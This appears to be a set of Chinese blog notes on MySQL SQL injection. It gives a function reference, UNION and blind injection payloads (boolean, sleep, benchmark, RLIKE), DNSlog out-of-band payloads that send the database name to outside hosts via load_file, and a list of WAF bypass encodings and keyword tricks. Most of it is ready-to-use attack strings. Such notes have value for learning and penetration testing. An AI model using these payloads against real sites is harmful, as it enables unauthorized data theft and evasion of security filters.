常用函数

函数名 作用 备注
version() 数据库版本
user() 数据库用户名
database() 数据库名
limit 0,1 返回数据的条数 第一个参数为起始行，第二个参数为返回的行数
substr(str,1,1) 截取字符串 第二个参数为起始位置，从1开始，第二个为截取的数量
mid(str,1,1) 同substr()
left(str,n) 返回字符串的前n个字符
right(str,n) 返回字符串的后n个字符
count(exp) 结果数量
load_file() 导入文件
hex() 转换为16进制
concat(str1,str2…) 合并多个字符串，没有分隔符
concat_ws(x,str1,str2..) 同concat(),第一个参数为分隔符
group_concat() 连接一个组的字符串，用组分割
ascii(str) 返回字符串第一个字符的ascii码
ord(str) 同ascii()
desc table_name 展示表中的字段名和数据类型
strcmp(expr1,expr2) 字符串比较，一样返回0，第一个小于第二个返回-1,第一个大于第二个返回1
RPAD(str,len,padstr) 在str右方补齐len位的padstr，如果len小于str，返回len长度的str
LPAD(str,len,padstr) 类似RPAD(),左补齐
INSERT(str,pos,len,newstr) 在原始字符串 str 中，将自左数第 pos 位开始，长度为 len 个字符的字符串替换为新字符串 newstr，然后返回经过替换后的字符串。INSERT(str,len,1,0x0)可当做截取函数。
LENGTH(str) 返回字符串的长度
PI() 返回π的具体数值
REGEXP “statement” 正则匹配，返回布尔值
LIKE “statement” 匹配数据，%代表任意内容，返回布尔值
RLIKE “statement” 与regexp相同
LOWER(str) 转换为小写，同LCASE(str)
UPPER(str) 转换为大写,同UCASE(str)
NULLIF(expr1,expr2) 如果相同，返回expr1，否则返回null
CHARSET(str) 返回字符串使用的字符集

sql注入手法

post @ 2020-12-23

UNION注入

  • Select col form table union select database();

如果前面的值为空，只返回后面的结果。
如若查询结果只能显示一条，可以用limit 0,1 或select group_concat(col)进行拼接

盲注

  • 返回true或false

1'%20and%20ascii(substr((select%20database()),1,1))>115--+

通过ascii字符截取判断

  • select * from users order by rand(True)

    select * from users order by rand(False)

返回的结果不同，利用rand(database()=’users’).

  • 时间盲注

    • 利用sleep()

      id=' or if(ascii(substr(database(),1,1))>114,sleep(3),0)%23

if(exp,sleep(3),0)，根据返回的时间来判断exp中是否为真；

    • 利用大量运算模拟sleep()

      id=' or if(ascii(substr(database(),1,1))>114,benchmark(10000000,sha(1)),0)%23

    • 通过笛卡尔积

      select balabala from table1 where '1'='2' or if(ascii(substr(database(),1,1))>0,(select count(*) from information_schema.tables A,information_schema.tables B,information_schema.tables C),0)

    • rlike+rpad

      rpad(1,349525,a)是指用a填充第一位的字符串以达到第二位的长度

select * from table1 where 1=1 and if(mid(user(),1,1)='r',concat(rpad(1,349525,'a'),rpad(1,349525,'a'),rpad(1,349525,'a')) RLIKE '(a.*)+(a.*)+(a.*)+(a.*)+(a.*)+(a.*)+(a.*)+asdasdsadasd',1);

    • DNSlog无回显盲注

      需要windows平台

在mysql中load_file会带dns查询请求

查看变量确定权限

`show variables like '%secure%'`

   1、当secure_file_priv为空，就可以读取磁盘的目录。

   2、当secure_file_priv为G:\，就可以读取G盘的文件。

   3、当secure_file_priv为null，load_file就不能加载文件。

需要secure_file_priv=""

5.5.34版本后默认为null，可以在my.ini中修改

unc共享路径  `\\\\xq17.com\tet，\\\\转义后为\\`

dnslog平台：http://dnslog.cn/

poc :`' and if((select load_file(concat('\\\\',(select database()),'.xxxx.ceye.io\\abc'))),1,0)--+`

poc :`select load_file(concat('\\\\',(select database()),'.f9bbk4.dnslog.cn\\abc'));`

注:域名后必须加\\\abc

sql注入bypass

post @ 2020-12-23

编码绕过

  • 大小写

  • url编码

  • html编码

  • 16进制 0x7573657273为users的16进制

       可以对单个字符进行16进制编码，也可对整个字符进行16进制编码

  • unicode编码 

        单引号：%u0027、%u02b9、%u02bc、%u02c8、%u2032、%uff07、%c0%27、%c0%a7、%e0%80%a7

     空格：%u0020、%uff00、%c0%20、%c0%a0、%e0%80%a0

     左括号：%u0028、%uff08、%c0%28、%c0%a8、%e0%80%a8

   右括号：%u0029、%uff09、%c0%29、%c0%a9、%e0%80%a9

  • 使用两种不同编码的字符进行比较，结果可能为 True 也可能为 False

注释

  • // – – + – - # /**/ ;%00
  • 内联注释 /**/ 可以绕过空格过滤
  • /*!UNION*/在mysql可以执行
  • index.php?id=-1 /*!UNION*/ /*!SELECT*/ 1,2,3

    关键字替换为空格时

union => ununionion

相同功能替换

  • 函数替换
    • substring / mid / sub
    • ascii / hex / bin
    • benchmark / sleep
  • 变量替换
    • user() / @@user
  • 符号和关键字
    • and / &
    • or / |

HTTP参数

http参数污染

id=1&id=2&id=3 根据容器不同会有不同的结果
